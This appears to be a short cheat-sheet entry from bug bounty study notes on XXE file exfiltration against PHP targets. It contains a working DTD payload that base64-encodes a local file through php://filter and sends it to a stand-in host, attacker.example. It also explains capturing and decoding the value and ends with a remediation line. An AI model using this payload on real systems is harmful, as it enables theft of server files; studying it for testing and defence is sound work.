# XXE PHP-Filter Base64 Exfiltration

- On PHP-based targets, a PHP URL wrapper can base64-encode file content before XXE exfiltration.
- This helps when raw file bytes or XML special characters break normal entity expansion.
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.example/?%file;'>">
%ent;
%exfiltrate;
```
- Host the DTD externally if required by the target parser's parameter-entity restrictions.
- Capture the outbound value on your server and base64-decode it locally.
- This technique depends on PHP stream-wrapper support and parser configuration.
- False-positive trap: non-PHP targets or disabled wrappers will not support `php://filter`.
- Remediation: disable external entities and unnecessary PHP stream wrappers for parser-controlled inputs.
## Source: Bug Bounty Bootcamp, Ch. 15
